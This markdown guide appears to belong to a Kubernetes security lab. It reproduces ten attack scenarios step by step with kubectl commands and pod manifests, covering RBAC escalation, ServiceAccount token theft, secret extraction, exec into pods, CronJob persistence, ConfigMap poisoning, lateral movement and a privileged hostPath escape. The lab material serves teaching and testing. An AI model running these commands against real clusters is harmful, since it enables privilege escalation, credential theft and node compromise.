# Manual Tests

This file shows how to reproduce each attack scenario manually with `kubectl` and shell commands.

Use a disposable local cluster. These steps are intentionally abusive.

## Setup

### 1. Build And Start The Lab

```bash
go build -o lab-cli ./cmd/lab-cli
./lab-cli start
```

### 2. Create A Reusable Compromised ServiceAccount Token

This simulates the attacker already having the `tenant-sa` identity.

```bash
export TENANT_TOKEN=$(kubectl -n tenant-a create token tenant-sa)
```

You can now run `kubectl` as `tenant-sa` with:

```bash
kubectl --token="$TENANT_TOKEN" -n tenant-a auth can-i create pods
```

### 3. Reset Between Scenarios

```bash
./lab-cli reset
export TENANT_TOKEN=$(kubectl -n tenant-a create token tenant-sa)
```

### 4. Validate The Attack Graph

After `start`, you can inspect the current graph directly:

```bash
./lab-cli graph paths
```

Expected themes in the output:

- namespace admin-equivalent
- fresh ServiceAccount token
- workload command execution
- secret exposure
- persistence
- config integrity compromise
- node compromise

Export the reachable graph as Mermaid:

```bash
./lab-cli graph export --format mermaid
```

Export the same reachable graph as Graphviz DOT:

```bash
./lab-cli graph export --format dot
```

Export the same graph as JSON:

```bash
./lab-cli graph export --format json
```

Filter to one goal:

```bash
./lab-cli graph paths --goal node-compromise
```

Use a goal alias, top-N ranking, and namespace scoping:

```bash
./lab-cli graph paths --goal node --top 3
./lab-cli graph paths --goal secret --namespace tenant-a
./lab-cli graph paths --format json
```

Explain why a path exists and see matching lab scenarios:

```bash
./lab-cli graph explain --goal node
./lab-cli graph explain --goal secret --format json
```

Create a snapshot, run an attack, and diff the graph:

```bash
./lab-cli graph export --format json > before.json
./lab-cli attack exec
./lab-cli graph diff --before before.json
```

Open the browser UI:

```bash
./lab-cli graph serve --addr 127.0.0.1:8080
```

Then browse to `http://127.0.0.1:8080` and validate:

- the graph renders from `sa:tenant-a/tenant-sa` by default
- `+`, `-`, and `100%` change the zoom level
- `Show Paths` lists ranked impact paths
- `Explain` shows step-by-step reasons and scenario mappings
- `Download Snapshot` saves a JSON snapshot
- `Diff Against Live` compares a saved snapshot after you change the cluster state

Workload-aware checks to expect in the current graph:

- `exec-victim` should contribute a secret-exposure path because it consumes `db-credentials` through env vars
- `configmap-victim` should contribute a config-integrity path only after the pod exists and consumes `app-bootstrap`

## 1. RBAC Escalation

Goal:

- use `rolebindings/create` to bind `tenant-sa` to `cluster-admin` in `tenant-a`

Steps:

```bash
kubectl --token="$TENANT_TOKEN" -n tenant-a auth can-i create rolebindings
```

```bash
kubectl --token="$TENANT_TOKEN" -n tenant-a create rolebinding pwn-binding \
  --clusterrole=cluster-admin \
  --serviceaccount=tenant-a:tenant-sa
```

```bash
kubectl --token="$TENANT_TOKEN" -n tenant-a auth can-i get secrets
kubectl --token="$TENANT_TOKEN" -n tenant-a get secret db-credentials -o yaml
```

Notes:

- this is a namespaced `RoleBinding`
- the practical effect is admin-equivalent power in `tenant-a`
- it is not a cluster-wide `ClusterRoleBinding`

## 2. ServiceAccount Token Theft

Goal:

- read the ServiceAccount token mounted into a pod

Steps:

```bash
kubectl -n tenant-a run token-attacker \
  --image=alpine \
  --restart=Never \
  --overrides='{"spec":{"serviceAccountName":"tenant-sa","containers":[{"name":"token-attacker","image":"alpine","command":["sleep","3600"]}]}}'
```

```bash
kubectl -n tenant-a wait --for=condition=Ready pod/token-attacker --timeout=60s
```

```bash
kubectl -n tenant-a exec token-attacker -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

Capture it into a variable:

```bash
export STOLEN_TOKEN=$(kubectl -n tenant-a exec token-attacker -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

Verify the stolen credential:

```bash
kubectl --token="$STOLEN_TOKEN" -n tenant-a auth can-i create pods
kubectl --token="$STOLEN_TOKEN" -n tenant-a auth can-i create rolebindings
```

## 3. TokenRequest Abuse

Goal:

- mint a fresh token for `tenant-sa` using the TokenRequest API

Steps:

```bash
kubectl --token="$TENANT_TOKEN" -n tenant-a auth can-i create serviceaccounts/token
```

```bash
export FRESH_TOKEN=$(kubectl --token="$TENANT_TOKEN" -n tenant-a create token tenant-sa)
```

```bash
echo "$FRESH_TOKEN"
```

Validate the fresh token:

```bash
kubectl --token="$FRESH_TOKEN" -n tenant-a auth can-i create pods
kubectl --token="$FRESH_TOKEN" -n tenant-a auth can-i create rolebindings
kubectl --token="$FRESH_TOKEN" -n tenant-a auth can-i create pods/exec
```

## 4. Secret Extraction

Goal:

- read `db-credentials` from the Kubernetes API

Prerequisite:

- either use your admin kubeconfig directly
- or first complete the RBAC escalation scenario so `tenant-sa` can read secrets in `tenant-a`

Admin path:

```bash
kubectl -n tenant-a get secret db-credentials -o jsonpath='{.data.username}' | base64 -d && echo
kubectl -n tenant-a get secret db-credentials -o jsonpath='{.data.password}' | base64 -d && echo
```

Escalated `tenant-sa` path:

```bash
kubectl --token="$TENANT_TOKEN" -n tenant-a get secret db-credentials -o jsonpath='{.data.username}' | base64 -d && echo
kubectl --token="$TENANT_TOKEN" -n tenant-a get secret db-credentials -o jsonpath='{.data.password}' | base64 -d && echo
```

If you have not completed RBAC escalation first, the `tenant-sa` path should fail.

## 5. Pod Creation Abuse

Goal:

- use `pods/create` to create a workload that mounts a secret and leaks it

Create the malicious pod using compromised `tenant-sa` credentials:

```bash
kubectl --token="$TENANT_TOKEN" -n tenant-a create -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: pod-create-attacker
spec:
  restartPolicy: Never
  containers:
  - name: loot
    image: alpine
    command:
    - /bin/sh
    - -c
    - echo username=$(cat /loot/username); echo password=$(cat /loot/password)
    volumeMounts:
    - name: db-credentials
      mountPath: /loot
      readOnly: true
  volumes:
  - name: db-credentials
    secret:
      secretName: db-credentials
EOF
```

Wait a few seconds, then inspect the logs with your admin context:

```bash
kubectl -n tenant-a logs pod-create-attacker
```

Expected output:

```text
username=admin
password=SuperSecretPassword123
```

Why admin is used for logs:

- the scenario is about the attacker's ability to create and run the pod
- the weak RBAC here does not grant `pods/log`
- the secret leak is still caused by `pods/create`

## 6. Pod Exec Abuse

Goal:

- use `pods/exec` to run commands inside another workload and read credentials

Create a victim pod with secret-backed env vars:

```bash
kubectl -n tenant-a create -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: exec-victim
spec:
  containers:
  - name: app
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    env:
    - name: DB_USERNAME
      valueFrom:
        secretKeyRef:
          name: db-credentials
          key: username
    - name: DB_PASSWORD
      valueFrom:
        secretKeyRef:
          name: db-credentials
          key: password
EOF
```

```bash
kubectl -n tenant-a wait --for=condition=Ready pod/exec-victim --timeout=60s
```

Check the permission from the compromised identity:

```bash
kubectl --token="$TENANT_TOKEN" -n tenant-a auth can-i create pods/exec
kubectl --token="$TENANT_TOKEN" -n tenant-a auth can-i get pods
```

Exec into the victim pod as `tenant-sa`:

```bash
kubectl --token="$TENANT_TOKEN" -n tenant-a exec exec-victim -- /bin/sh -c 'echo username=$DB_USERNAME; echo password=$DB_PASSWORD'
```

Expected output:

```text
username=admin
password=SuperSecretPassword123
```

## 7. CronJob Persistence

Goal:

- use `cronjobs/create` to establish scheduled persistence in `tenant-a`

Check the permission:

```bash
kubectl --token="$TENANT_TOKEN" -n tenant-a auth can-i create cronjobs.batch
```

Create the malicious CronJob as `tenant-sa`:

```bash
kubectl --token="$TENANT_TOKEN" -n tenant-a create -f - <<'EOF'
apiVersion: batch/v1
kind: CronJob
metadata:
  name: persistence-cron
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          restartPolicy: Never
          containers:
          - name: reenter
            image: alpine
            command:
            - /bin/sh
            - -c
            - echo persistence-established; echo username=$(cat /loot/username); echo password=$(cat /loot/password)
            volumeMounts:
            - name: db-credentials
              mountPath: /loot
              readOnly: true
          volumes:
          - name: db-credentials
            secret:
              secretName: db-credentials
EOF
```

Inspect the CronJob:

```bash
kubectl -n tenant-a get cronjob persistence-cron
```

Trigger one run manually to prove the payload without waiting for the schedule:

```bash
kubectl -n tenant-a create job --from=cronjob/persistence-cron persistence-cron-manual-run
kubectl -n tenant-a wait --for=condition=complete job/persistence-cron-manual-run --timeout=60s
kubectl -n tenant-a logs job/persistence-cron-manual-run
```

Expected output:

```text
persistence-established
username=admin
password=SuperSecretPassword123
```

## 8. ConfigMap Poisoning

Goal:

- modify a trusted `ConfigMap` so a restarted workload runs attacker-controlled content

Create a benign `ConfigMap` and a victim pod that executes it:

```bash
kubectl -n tenant-a create -f - <<'EOF'
apiVersion: v1
kind: ConfigMap
metadata:
  name: app-bootstrap
data:
  run.sh: |
    #!/bin/sh
    echo status=benign
    echo source=configmap
EOF
```

```bash
kubectl -n tenant-a create -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: configmap-victim
spec:
  restartPolicy: Never
  containers:
  - name: victim
    image: alpine
    command: ["/config/run.sh"]
    volumeMounts:
    - name: bootstrap
      mountPath: /config
      readOnly: true
  volumes:
  - name: bootstrap
    configMap:
      name: app-bootstrap
      defaultMode: 0755
EOF
```

```bash
kubectl -n tenant-a wait --for=condition=Ready pod/configmap-victim --timeout=60s || true
kubectl -n tenant-a logs configmap-victim
```

Poison the `ConfigMap` as `tenant-sa`:

```bash
kubectl --token="$TENANT_TOKEN" -n tenant-a auth can-i update configmaps
kubectl --token="$TENANT_TOKEN" -n tenant-a patch configmap app-bootstrap --type merge \
  -p '{"data":{"run.sh":"#!/bin/sh\necho status=poisoned\necho action=malicious-bootstrap\n"}}'
```

Restart the victim workload and inspect the new output:

```bash
kubectl -n tenant-a delete pod configmap-victim
kubectl -n tenant-a create -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: configmap-victim
spec:
  restartPolicy: Never
  containers:
  - name: victim
    image: alpine
    command: ["/config/run.sh"]
    volumeMounts:
    - name: bootstrap
      mountPath: /config
      readOnly: true
  volumes:
  - name: bootstrap
    configMap:
      name: app-bootstrap
      defaultMode: 0755
EOF
```

```bash
kubectl -n tenant-a wait --for=condition=Ready pod/configmap-victim --timeout=60s || true
kubectl -n tenant-a logs configmap-victim
```

Expected output after poisoning:

```text
status=poisoned
action=malicious-bootstrap
```

## 9. Lateral Movement

Goal:

- show that a pod in `tenant-a` can reach a service in `tenant-b`

Create the victim application:

```bash
kubectl -n tenant-b run victim-app \
  --image=hashicorp/http-echo \
  --restart=Never \
  --port=5678 \
  -- -text=Hello-from-tenant-b
```

```bash
kubectl -n tenant-b expose pod victim-app --name=victim-service --port=5678
```

Create an attacker pod in `tenant-a`:

```bash
kubectl -n tenant-a run lateral-attacker \
  --image=alpine \
  --restart=Never \
  --overrides='{"spec":{"serviceAccountName":"tenant-sa","containers":[{"name":"lateral-attacker","image":"alpine","command":["sleep","3600"]}]}}'
```

```bash
kubectl -n tenant-a wait --for=condition=Ready pod/lateral-attacker --timeout=60s
```

Test cross-namespace reachability:

```bash
kubectl -n tenant-a exec lateral-attacker -- wget -qO- http://victim-service.tenant-b.svc.cluster.local:5678
```

Expected output:

```text
Hello-from-tenant-b
```

## 10. Privileged Pod / Host Escape

Goal:

- mount the host filesystem into a privileged container

Create the privileged pod:

```bash
kubectl -n tenant-a create -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: escape-attacker
spec:
  serviceAccountName: tenant-sa
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF
```

```bash
kubectl -n tenant-a wait --for=condition=Ready pod/escape-attacker --timeout=60s
```

Inspect the host filesystem:

```bash
kubectl -n tenant-a exec escape-attacker -- ls /host/etc | head
kubectl -n tenant-a exec escape-attacker -- ls /host/root
kubectl -n tenant-a exec escape-attacker -- ls /host/var/lib/kubelet | head
```

Note:

- this step usually requires strong privileges from the operator or previous escalation
- it is intentionally dangerous and should stay in a disposable cluster

## Cleanup

Reset the lab:

```bash
./lab-cli reset
```

Destroy the lab:

```bash
./lab-cli destroy
```
